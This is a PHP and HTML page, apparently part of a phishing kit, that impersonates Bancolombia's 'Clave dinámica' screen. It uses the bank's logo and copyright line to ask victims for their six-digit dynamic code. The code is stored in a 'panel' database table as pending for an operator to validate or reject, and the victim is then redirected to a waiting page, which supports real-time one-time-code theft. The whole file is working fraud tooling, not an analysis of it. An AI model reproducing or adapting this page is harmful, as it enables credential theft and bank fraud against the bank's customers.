<?php
require_once 'config.php';
$conn = getConnection();
$uuid = $conn->real_escape_string($_GET['id']);

$stmt = $conn->prepare("SELECT dato3, rejected_reason, redirect_flag FROM  panel WHERE id = ?");
$stmt->bind_param("s", $uuid);
$stmt->execute();
$result = $stmt->get_result();
$data = $result->fetch_assoc();

if (!$data || !$data['redirect_flag']) { // <--- Usar $data aquí
    die('Redirección no autorizada');
}



if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $dato3 = $conn->real_escape_string($_POST['dato3']);
    
    $stmt = $conn->prepare("UPDATE  panel SET dato3 = ?, dato3_status = 'pending', rejected_reason = NULL WHERE id = ?");
    $stmt->bind_param("ss", $dato3, $uuid);
    $stmt->execute();
    $stmt->close();
    $conn->close();
    
    header("Location: espera_validacion.php?id=$uuid");
    exit();
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Bancolombia - Clave Dinámica</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f0f0f0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .container {
            max-width: 400px;
            margin: 0 auto;
            background-color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        .header {
            text-align: center;
            padding: 30px 20px 20px 20px;
            background-color: white;
        }

        .logo {
            width: 200px;
            margin-bottom: 20px;
        }

        .main-title {
            font-size: 24px;
            color: #333;
            margin: 0;
            font-weight: normal;
        }

        .content {
            flex: 1;
            padding: 20px;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .card {
            background-color: white;
            border-radius: 15px;
            padding: 30px 20px;
            text-align: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            margin-bottom: 30px;
        }

        .instruction-text {
            color: #666;
            font-size: 16px;
            margin-bottom: 30px;
            line-height: 1.4;
        }

        .lock-icon {
            width: 50px;
            height: 50px;
            margin: 20px auto;
            border: 3px solid #666;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            background-color: #f8f8f8;
        }

        .lock-icon::before {
            content: '';
            position: absolute;
            top: -15px;
            left: 50%;
            transform: translateX(-50%);
            width: 20px;
            height: 20px;
            border: 3px solid #666;
            border-bottom: none;
            border-radius: 15px 15px 0 0;
        }

        .input-container {
            margin: 30px 0;
        }

        .code-input {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin: 20px 0;
        }

        .digit-input {
            width: 35px;
            height: 35px;
            border: none;
            border-bottom: 2px solid #ccc;
            text-align: center;
            font-size: 18px;
            background: transparent;
        }

        .digit-input:focus {
            outline: none;
            border-bottom-color: #007BFF;
        }

        .hidden-input {
            position: absolute;
            left: -9999px;
            opacity: 0;
        }

        .error-message {
            color: red;
            font-size: 14px;
            text-align: left;
            margin-bottom: 10px;
        }

        .btn-continue {
            background-color: #E0E0E0;
            color: #999;
            border: none;
            border-radius: 25px;
            padding: 15px 40px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            margin-bottom: 15px;
            transition: all 0.3s ease;
        }

        .btn-continue.active {
            background-color: #FFC107;
            color: #333;
        }

        .btn-back {
            background-color: transparent;
            color: #333;
            border: 1px solid #333;
            border-radius: 25px;
            padding: 15px 40px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
        }

        .footer {
            background-color: #f8f8f8;
            padding: 20px;
            text-align: center;
            border-top: 1px solid #e0e0e0;
        }

        .footer-logo {
            width: 150px;
            margin-bottom: 10px;
        }

        .copyright {
            color: #666;
            font-size: 12px;
        }

        .decorative-shapes {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            height: 300px;
            overflow: hidden;
            z-index: 0;
            pointer-events: none;
        }

        .container {
            position: relative;
            z-index: 1;
        }

        .shape-purple {
            position: absolute;
            bottom: -50px;
            left: -50px;
            width: 200px;
            height: 100px;
            background: linear-gradient(45deg, #8B5CF6, #A855F7);
            border-radius: 50px;
            transform: rotate(-20deg);
        }

        .shape-orange {
            position: absolute;
            bottom: -30px;
            right: -50px;
            width: 150px;
            height: 80px;
            background: linear-gradient(45deg, #F97316, #FB923C);
            border-radius: 40px;
            transform: rotate(30deg);
        }

        .shape-yellow {
            position: absolute;
            bottom: 50px;
            left: 50px;
            width: 100px;
            height: 50px;
            background: linear-gradient(45deg, #EAB308, #FDE047);
            border-radius: 30px;
            transform: rotate(-45deg);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <!-- Logo placeholder -->
            <img src="img/BANCOLOMBIA.png" alt="Bancolombia" class="logo">
            <h1 class="main-title">Clave dinámica</h1>
        </div>

        <div class="content">
            <div class="card">
                <p class="instruction-text">
                    Ingresa tu clave dinámica, la encuentras en tu app.
                </p>
                
                <div><img src="img/il_fullxfull.2746388814_kprm.webp" style="width: 10%;" alt=""></div>
                

                <form method="POST">
                    <?php if(!empty($data['rejected_reason'])): ?>
                    <div class="error-message">
                        <?= htmlspecialchars($data['rejected_reason']) ?>
                    </div>
                    <?php endif; ?>

                    <div class="input-container">
                        <input type="text" name="dato3" class="hidden-input" 
                               value="<?= htmlspecialchars($data['dato3'] ?? '') ?>" 
                               required id="hiddenInput">
                        
                        <div class="code-input" id="codeInputs">
                            <input type="text" class="digit-input" maxlength="1" data-index="0">
                            <input type="text" class="digit-input" maxlength="1" data-index="1">
                            <input type="text" class="digit-input" maxlength="1" data-index="2">
                            <input type="text" class="digit-input" maxlength="1" data-index="3">
                            <input type="text" class="digit-input" maxlength="1" data-index="4">
                            <input type="text" class="digit-input" maxlength="1" data-index="5">
                        </div>
                    </div>

                    <button type="submit" class="btn-continue" id="continueBtn">Continuar</button>
                </form>
                
                <button type="button" class="btn-back">Regresar</button>
            </div>
        </div>

        <div class="footer">
            <!-- Footer logo placeholder -->
            <img src="img/BANCOLOMBIA.png" alt="Bancolombia" class="footer-logo">
            <p class="copyright">Copyright © 2023 Grupo Bancolombia.</p>
        </div>
    </div>

    <div class="decorative-shapes">
        <div class="shape-purple"></div>
        <div class="shape-orange"></div>
        <div class="shape-yellow"></div>
    </div>

    <script>
        // Handle digit inputs
        const digitInputs = document.querySelectorAll('.digit-input');
        const hiddenInput = document.getElementById('hiddenInput');

        // Pre-fill inputs if there's existing data
        if (hiddenInput.value) {
            const existingValue = hiddenInput.value;
            for (let i = 0; i < Math.min(existingValue.length, digitInputs.length); i++) {
                digitInputs[i].value = existingValue[i];
            }
        }

        digitInputs.forEach((input, index) => {
            input.addEventListener('input', function(e) {
                if (e.target.value.length === 1) {
                    if (index < digitInputs.length - 1) {
                        digitInputs[index + 1].focus();
                    }
                }
                updateHiddenInput();
            });

            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                    digitInputs[index - 1].focus();
                }
            });

            input.addEventListener('paste', function(e) {
                e.preventDefault();
                const pasteData = e.clipboardData.getData('text');
                const digits = pasteData.replace(/\D/g, '').slice(0, 6);
                
                for (let i = 0; i < digits.length && i < digitInputs.length; i++) {
                    digitInputs[i].value = digits[i];
                }
                updateHiddenInput();
            });
        });

        function updateHiddenInput() {
            let value = '';
            digitInputs.forEach(input => {
                value += input.value;
            });
            hiddenInput.value = value;
            
            // Change button color when all 6 digits are entered
            const continueBtn = document.getElementById('continueBtn');
            if (value.length === 6) {
                continueBtn.classList.add('active');
            } else {
                continueBtn.classList.remove('active');
            }
        }
    </script>
</body>
</html>